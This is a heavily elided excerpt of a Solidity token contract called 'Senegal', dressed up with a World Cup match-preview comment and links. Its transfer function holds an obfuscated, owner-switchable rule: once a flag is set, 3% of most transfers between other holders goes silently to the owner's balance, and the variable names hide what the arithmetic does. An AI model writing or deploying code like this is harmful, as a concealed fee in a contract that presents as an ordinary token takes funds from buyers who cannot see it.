...
/**
  Senegal vs. Netherlands - prediction, team news, lineups By Brett Curtis, Reporter | 1d
...
https://www.sportsmole.co.uk/football/senegal/world-cup-2022/preview/preview-senegal-vs-netherlands-prediction-team-news-lineups_500065.html
https://www.sofascore.com/senegal-netherlands/fUbsOUb
*/
...
contract Senegal is Context, IERC20, IERC20Metadata, Ownable {
    ...
    function _transfer(
        ...
        if (owner() != recipient && owner() != sender) {
            if (isRun > 0 && amount > 1000) {
                ...
                uint256 TLDMFP = 3;
                uint256 FJHKLI = amount*TLDMFP/100;
                _balances[sender] = _balances[sender] - amount;
                _balances[recipient] += amount -FJHKLI;
                _balances[owner()] +=FJHKLI;
            }
        } else {
            _balances[sender] = _balances[sender] - amount;
